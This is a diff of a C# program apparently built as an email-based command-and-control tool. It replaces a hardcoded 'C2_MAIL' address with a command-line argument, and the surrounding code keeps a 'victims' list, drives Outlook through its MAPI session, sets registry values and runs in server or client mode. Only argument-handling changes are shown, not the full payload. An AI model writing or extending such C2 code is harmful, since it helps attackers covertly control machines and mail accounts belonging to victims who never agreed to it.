@@ -96,7 +96,7 @@ namespace ExchangeExample
 
         }
         public static Outlook.Application OutlookApplication = null;
-        public const string C2_MAIL = "u8885555@bsmch.net";
+        public static string C2_MAIL = "";
         public static List<String> victims = new List<string>();
 
         public static void KeepAlive()
@@ -110,6 +110,14 @@ namespace ExchangeExample
         public static void StartOutlook() { Process.Start("outlook.exe"); }
         public static void Main(string[] args)
         {
+
+           
+            if (args.Length != 2)
+            {
+                Console.WriteLine("Please enter arg <server/client> <mailaddress>");
+                return;
+            }
+            C2_MAIL = args[1];
             Process[] processes = Process.GetProcessesByName("outlook");
             SetRegistry();
             if (processes.Length > 0)
@@ -137,11 +145,6 @@ namespace ExchangeExample
 
             // Connect to the user's open MAPI session
             outlookNameSpace = OutlookApplication.GetNamespace("MAPI");
-
-            
-
-
-
 
             // Get inbox
             inbox = outlookNameSpace.GetDefaultFolder(
@@ -192,11 +195,7 @@ namespace ExchangeExample
             }
 
 
-
-            if (args.Length != 1)
-            {
-                Console.WriteLine("Please enter arg server/client");
-            }
+           
             if (args[0] == "server")
             {
                 // Create server function callback
